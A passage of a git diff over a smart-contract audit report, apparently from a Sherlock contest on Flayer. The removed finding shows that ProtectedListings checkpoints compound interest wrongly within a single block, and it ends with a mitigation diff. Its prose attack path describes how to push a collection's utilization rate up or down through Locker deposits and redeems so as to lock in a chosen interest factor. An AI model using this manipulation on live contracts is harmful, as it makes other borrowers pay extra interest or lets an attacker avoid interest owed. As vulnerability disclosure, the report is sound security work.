-        Checkpoint memory previousCheckpoint = collectionCheckpoints[_collection][collectionCheckpoints[_collection].length - 1];
-
-        // Save the new checkpoint
-        checkpoint_ = Checkpoint({
-            compoundedFactor: locker.taxCalculator().calculateCompoundedFactor({
-                _previousCompoundedFactor: previousCheckpoint.compoundedFactor,
-                _utilizationRate: _utilizationRate,
-                // @audit Evaluates to 0 from the second time on this is being called within the same block and thus compounding
-                // the {_previousCompoundFactor} by 1 – essentially not changing it.
-→               _timePeriod: block.timestamp - previousCheckpoint.timestamp
-            }),
-            timestamp: block.timestamp
-        });
-    }
-```
-
-
-### Internal pre-conditions
-
-None
-
-### External pre-conditions
-
-None
-
-### Attack Path
-
-The error in compounded factor calculation will happen by itself alone. However, this can also be exploited intentionally. 
-
-$utilizationRate = \dfrac{collection\ protected\ listings\ count\ *\ 1e36\ *\ 10^{denomination}}{CT\ total\ supply}$
-
-So as evident from the formula above – for a constant collection protected listings count, the higher the CollectionToken (CT) total supply for a collection, the lower the utilization rate. And the lower the CT total supply – the higher the utilization rate.
-
-A few scenarios we came up with:
-1. A malicious actor can use it to lock in a higher `compoundedFactor` for the current block's checkpoint forcing users that have protected listings in that collection to accrue more interest over the same period of time as they can control the `utilizationRate` of a collection. The attacker can deposit NFTs directly to the **Locker** in one block then in the next block redeem them to bring up the `utilizationRate` and then call **ProtectedListings**#`createCheckpoint()` to lock in a higher compounded factor for that block. After that they can deposit back the NFTs in the same block so they are able to repeat this attack for as long as they wish.
-2. A malicious actor can deposit NFTs at the beginning of a block to bring down the `utilizationRate` of a collection and then call **ProtectedListings**#`createCheckpoint()` to lock in a lower `compoundedFactor` for the collection's current block checkpoint. Thus the attacker and other users will accrue less interest on their protected listings (loans). After this they can redeem the listings in the **Locker** and get their NFTs back.
-
-
-### Impact
-
-Due to some actions in the **Locker** contract **NOT** checkpointing a collection's compounded factor – `deposit()`, `redeem()` and `unbackedDeposit()` (which is an issue of its own with a different root cause), an attacker or an unsuspecting user can lock in the current block's checkpoint for a collection at a better or worse `compoundedFactor` than what the actual compounded factor for that collection will be at the end of the block when more actions that affect its utilization rate are performed.
-
-$compoundedFactor = \dfrac{previousCompoundFactor\ *\ (1e18 + (perSecondRate\ / 1000 * timePeriod))}{1e18}$
-
-Where:
-$perSecondRate = \dfrac{interestRate * 1e18}{365 * 24 * 60 * 60}$
-
-$interestRate = 200 + \dfrac{utilizationRate * 600}{0.8e18}$ – When `utilizationRate` ≤ 0.8e18 (`UTILIZATION_KINK`)
-OR
-$interestRate = (\dfrac{(utilizationRate - 200) * (100 - 8)}{1e18 - 200} + 8) * 100$ – When `utilizationRate` > 0.8e18 (`UTILIZATION_KINK`)
-
-Which shows the `compoundedFactor` is a function of the `utilizationRate` (and the `timePeriod` and the `previousCompoundFactor`) which is controllable by anyone due to another issue with a different root cause, and as outlined in the **Attack Path** section, for a constant collection protected listings count, the higher the CollectionToken (CT) total supply for a collection, the lower the utilization rate. And the lower the CT total supply – the higher the utilization rate.
-
-As a result owners of protected listings in a given collection can be made to pay more interest on their loans or the borrowers themselves can lower the interest they are supposed to pay on their loans.
-
-
-### PoC
-
-See **Attack Path** and **Impact**.
-
-
-### Mitigation
-
-```diff
-diff --git a/flayer/src/contracts/ProtectedListings.sol b/flayer/src/contracts/ProtectedListings.sol
-index 92ac03a..575e3ff 100644
---- a/flayer/src/contracts/ProtectedListings.sol
-+++ b/flayer/src/contracts/ProtectedListings.sol
-@@ -584,6 +584,13 @@ contract ProtectedListings is IProtectedListings, ReentrancyGuard {
-         // Update the compounded factor with the new interest rate and time period
-         Checkpoint memory previousCheckpoint = collectionCheckpoints[_collection][collectionCheckpoints[_collection].length - 1];
- 
-+        // If there is already a checkpoint for this block, actually get the truly previous
-+        // checkpoint which is second to last as in the beginning of a block we've pushed the
-+        // current new checkpoint to the array.
-+        if (previousCheckpoint.timestamp == block.timestamp) {
-+            previousCheckpoint = collectionCheckpoints[_collection][collectionCheckpoints[_collection].length - 2];
-+        }
-+
-         // Save the new checkpoint
-         checkpoint_ = Checkpoint({
-             compoundedFactor: locker.taxCalculator().calculateCompoundedFactor({
-
-```
-
-
-# Issue M-19: FTokens are burned after `quorumVotes` are recorded making a portion of the shares unclaimable 
+# Issue M-22: FTokens are burned after `quorumVotes` are recorded making a portion of the shares unclaimable 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/610 
 
